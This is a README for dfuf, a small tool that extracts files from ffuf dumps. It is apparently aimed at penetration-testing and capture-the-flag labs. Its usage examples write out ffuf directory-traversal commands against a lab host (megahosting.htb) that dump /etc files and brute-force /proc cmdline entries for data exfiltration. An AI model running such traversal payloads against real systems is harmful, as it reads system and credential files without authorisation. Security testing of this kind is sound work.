# dfuf - Dump Faster U Fool

## About

> The name of **dfuf** was inspired by **ffuf** (Fuzz Faster U Fool)

### Why dfuf?

This simple script can extract files from **ffuf** request/response dump (`-od` option).

**ffuf** should be faster than any LFI dumpers available on the public.

### Example Scenarios

- When one was stuck at initial foothold, he/she might need to dump files via LFI / Directory Traversal vulnerability for further enumeration.

- When getting shell is impossible, one may perform data exfiltration by dumping files via LFI / Directory Traversal vulnerability.

## Demo

[![asciicast](https://asciinema.org/a/FBwbf8oRoy869FkCgR8JjaGeM.svg)](https://asciinema.org/a/FBwbf8oRoy869FkCgR8JjaGeM)

## Installation

Make sure [pipx](https://github.com/pypa/pipx?tab=readme-ov-file#install-pipx) is installed.

```bash
pipx install git+https://github.com/opabravo/dfuf
```

## Usage

```bash
usage: dfuf [-h] -o FFUF_JSON_OUTPUT -od FFUF_OUTPUT_DIR dir_to_save_extracted_files

A tool to extract files from ffuf output

https://github.com/opabravo/dfuf

positional arguments:
  dir_to_save_extracted_files
                        Output directory where extracted files will be saved

options:
  -h, --help            show this help message and exit
  -o FFUF_JSON_OUTPUT, --ffuf-json-output FFUF_JSON_OUTPUT
                        Json output file from ffuf
  -od FFUF_OUTPUT_DIR, --ffuf-output-dir FFUF_OUTPUT_DIR
                        Output directory from ffuf

Usage:
    1. Dump files with ffuf
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json

    2. Extract files from ffuf output
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

Examples:
    1. Common linux files (880 lines) (~8 sec)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

    2. Common files under `/etc` (8314 lines) (~1 min)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w '/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt' -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

    3. Brute force cmdline in `/proc` (~1 min)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

        View the result in a pretty format :
        $ find ffuf_dump/proc -type f -exec bash -c 'pid=$(echo $0 | cut -d '/' -f3); echo -en "\n$pid | "; cat $0 | tr "\0" " "' {} \; | sort -s -n -k 1,1
```

## License

[MIT](LICENSE)


